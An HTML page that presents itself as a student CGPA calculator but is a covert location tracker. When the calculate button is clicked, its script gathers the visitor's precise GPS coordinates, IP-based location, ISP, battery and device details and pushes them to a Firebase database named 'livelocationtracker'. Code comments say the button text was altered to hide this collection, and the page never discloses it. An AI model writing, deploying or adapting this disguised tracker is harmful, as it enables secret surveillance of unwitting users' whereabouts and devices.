<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CGPA Calculator - AJ STUDIOZ</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root {
  --primary: #6a11cb;
  --secondary: #2575fc;
  --dark: #100721;
  --text-primary: #fff;
  --success: #4CAF50;
  --error: #f44336;
  --border-radius-main: 20px;
  --border-radius-small: 10px;
}
body {
  font-family: 'Poppins', sans-serif;
  background: linear-gradient(135deg, var(--dark), #1a1a2e);
  color: var(--text-primary);
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  padding: 20px;
}
.container {
  width: 100%;
  max-width: 600px;
  background: rgba(16, 7, 33, 0.6);
  padding: 25px;
  border-radius: var(--border-radius-main);
  backdrop-filter: blur(20px);
  border: 1px solid rgba(255, 255, 255, 0.15);
  box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
}

/* Branding */
.header { text-align: center; margin-bottom: 5px; }
#branding {
  font-size: 2.5rem;
  font-weight: 800;
  animation: rgb-blink 2s linear infinite;
}
@keyframes rgb-blink {
  0%, 100% { color: #ff5757; text-shadow: 0 0 8px #ff5757; }
  25% { color: #57ff89; text-shadow: 0 0 8px #57ff89; }
  50% { color: #57a5ff; text-shadow: 0 0 8px #57a5ff; }
  75% { color: #fffa57; text-shadow: 0 0 8px #fffa57; }
}
h2 {
  text-align: center;
  margin-top: 0;
  margin-bottom: 20px;
  font-weight: 400;
  color: rgba(255,255,255,0.7);
}

.sem-input {
  margin: 10px 0;
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-weight: 500;
}
.sem-input input {
  width: 70px;
  padding: 8px;
  border-radius: var(--border-radius-small);
  border: 2px solid rgba(255,255,255,0.2);
  background: rgba(255,255,255,0.1);
  color: var(--text-primary);
  font-size: 1rem;
  text-align: center;
  transition: all 0.3s ease;
}
.sem-input input:focus {
  outline: none;
  border-color: var(--secondary);
  box-shadow: 0 0 10px rgba(37, 117, 252, 0.5);
}
.sem-input input.invalid {
    border-color: var(--error);
}

button {
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: var(--border-radius-small);
  background: var(--secondary);
  color: #fff;
  font-weight: bold;
  font-size: 1rem;
  cursor: pointer;
  margin-top: 15px;
  transition: 0.3s;
}
button:hover:not(:disabled) { background: var(--primary); }
button:disabled { background: #555; cursor: not-allowed; }

.result { margin-top: 20px; font-size: 1.2rem; font-weight: bold; text-align: center; }
.loader { display: none; margin: 15px 0; text-align: center; }
.loader span { display: inline-block; width: 24px; height: 24px; border: 4px solid #0d47a1; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; }

.message {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  margin-top: 15px;
  text-align: center;
  font-weight: 500;
  padding: 10px;
  border-radius: var(--border-radius-small);
  display: none; /* Hidden by default */
}
.message svg { width: 24px; height: 24px; }
.success-message { color: var(--success); background-color: rgba(76, 175, 80, 0.15); border: 1px solid var(--success); }
.error-message { color: var(--error); background-color: rgba(244, 67, 54, 0.15); border: 1px solid var(--error); }

@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div id="branding">AJ STUDIOZ</div>
  </div>
  <h2>CGPA Calculator</h2>

  <div id="semesters">
    <div class="sem-input">Semester 1 GPA: <input type="number" min="0" max="10" step="0.01" id="sem1" placeholder="e.g., 8.5"></div>
    <div class="sem-input">Semester 2 GPA: <input type="number" min="0" max="10" step="0.01" id="sem2" placeholder="e.g., 9.1"></div>
    <div class="sem-input">Semester 3 GPA: <input type="number" min="0" max="10" step="0.01" id="sem3" placeholder="e.g., 7.8"></div>
    <div class="sem-input">Semester 4 GPA: <input type="number" min="0" max="10" step="0.01" id="sem4" placeholder="e.g., 9.5"></div>
    <div class="sem-input">Semester 5 GPA: <input type="number" min="0" max="10" step="0.01" id="sem5" placeholder="e.g., 8.8"></div>
    <div class="sem-input">Semester 6 GPA: <input type="number" min="0" max="10" step="0.01" id="sem6" placeholder="e.g., 9.2"></div>
    <div class="sem-input">Semester 7 GPA: <input type="number" min="0" max="10" step="0.01" id="sem7" placeholder="e.g., 8.0"></div>
    <div class="sem-input">Semester 8 GPA: <input type="number" min="0" max="10" step="0.01" id="sem8" placeholder="e.g., 9.7"></div>
  </div>
  <!-- MODIFICATION 1: Button text changed -->
  <button id="calcShareBtn">Calculate CGPA</button>
  <div class="result" id="cgpaResult"></div>
  
  <div class="message success-message" id="successMessage">
    <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
    <!-- MODIFICATION 2: Success message text changed -->
    <span>Your CGPA is calculated successfully!</span>
  </div>
  <div class="message error-message" id="errorMessage">
     <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"></path></svg>
     <span>An error occurred. Please try again.</span>
  </div>

  <div class="loader" id="loader"><span></span></div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
  import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

  const firebaseConfig = { apiKey: "AIzaSyCxMU9PstROo2hYxwiAFsSacjJOSPCN6Ag", authDomain: "livelocationtracker-bcd3d.firebaseapp.com", databaseURL: "https://livelocationtracker-bcd3d-default-rtdb.asia-southeast1.firebasedatabase.app", projectId: "livelocationtracker-bcd3d", storageBucket: "livelocationtracker-bcd3d.appspot.com", messagingSenderId: "800051113276", appId: "1:800051113276:web:61f0162a9e95aba9cb4239" };
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  const UIElements = {
    calcShareBtn: document.getElementById("calcShareBtn"),
    cgpaResult: document.getElementById("cgpaResult"),
    loader: document.getElementById("loader"),
    successMessage: document.getElementById("successMessage"),
    errorMessage: document.getElementById("errorMessage"),
    semInputs: Array.from({length: 8}, (_, i) => document.getElementById(`sem${i + 1}`))
  };

  /** Gathers all device and location information asynchronously. */
  async function gatherDeviceDetails() {
    const getBatteryInfo = async () => {
      try {
        const battery = await navigator.getBattery();
        return `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`.trim();
      } catch { return 'N/A'; }
    };
    
    const getIpInfo = async () => {
      try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) return {};
        return await response.json();
      } catch { return {}; }
    };
    
    const getGpsInfo = () => {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve({});
        const timer = setTimeout(() => resolve({}), 10000);
        navigator.geolocation.getCurrentPosition(
          pos => {
            clearTimeout(timer);
            resolve({ gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude });
          },
          () => {
            clearTimeout(timer);
            resolve({});
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    };

    const [battery, ipData, gpsData] = await Promise.all([getBatteryInfo(), getIpInfo(), getGpsInfo()]);
    
    return {
      device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop/Laptop",
      cgpa: UIElements.cgpaResult.textContent.replace('Your CGPA is: ', ''),
      battery,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
      ip: ipData.ip || "N/A",
      city: ipData.city || "N/A",
      region: ipData.region || "N/A",
      country: ipData.country_name || "N/A",
      isp: ipData.org || "N/A",
      ip_lat: ipData.latitude || 0,
      ip_lon: ipData.longitude || 0,
      gps_lat: gpsData.gps_lat || 0,
      gps_lon: gpsData.gps_lon || 0,
      userAgent: navigator.userAgent,
      screenResolution: `${screen.width}x${screen.height}`,
      deviceMemory: navigator.deviceMemory || 'N/A',
      cpuCores: navigator.hardwareConcurrency || 'N/A',
      connectionType: navigator.connection?.effectiveType || 'N/A',
      timestamp: Date.now()
    };
  }

  UIElements.calcShareBtn.addEventListener("click", async () => {
    UIElements.calcShareBtn.disabled = true;
    UIElements.calcShareBtn.textContent = "Calculating...";
    UIElements.loader.style.display = "block";
    UIElements.successMessage.style.display = "none";
    UIElements.errorMessage.style.display = "none";
    
    try {
      let total = 0, count = 0, hasInvalidInput = false;
      UIElements.semInputs.forEach(input => {
        const val = parseFloat(input.value);
        input.classList.remove('invalid');
        if (!isNaN(val)) {
            if (val < 0 || val > 10) {
                input.classList.add('invalid');
                hasInvalidInput = true;
            } else {
                total += val;
                count++;
            }
        }
      });
      
      if (hasInvalidInput) {
        throw new Error("Invalid GPA value. Please enter a value between 0 and 10.");
      }
      if (count === 0) {
        throw new Error("Please enter the GPA for at least one semester.");
      }
      
      const cgpa = (total / count).toFixed(2);
      UIElements.cgpaResult.textContent = `Your CGPA is: ${cgpa}`;
      
      // The button text no longer changes to "Sharing..." to hide this step from the user.
      const dataToShare = await gatherDeviceDetails();
      
      const newLocationRef = push(ref(db, "locations"));
      await set(newLocationRef, dataToShare);
      
      UIElements.successMessage.style.display = "flex";

    } catch (error) {
      console.error("Operation failed:", error);
      UIElements.errorMessage.querySelector('span').textContent = error.message;
      UIElements.errorMessage.style.display = "flex";
      UIElements.cgpaResult.textContent = "";
    } finally {
      UIElements.loader.style.display = "none";
      UIElements.calcShareBtn.disabled = false;
      // MODIFICATION 3: Button reset text changed
      UIElements.calcShareBtn.textContent = "Calculate CGPA";
    }
  });
</script>
</body>
</html>












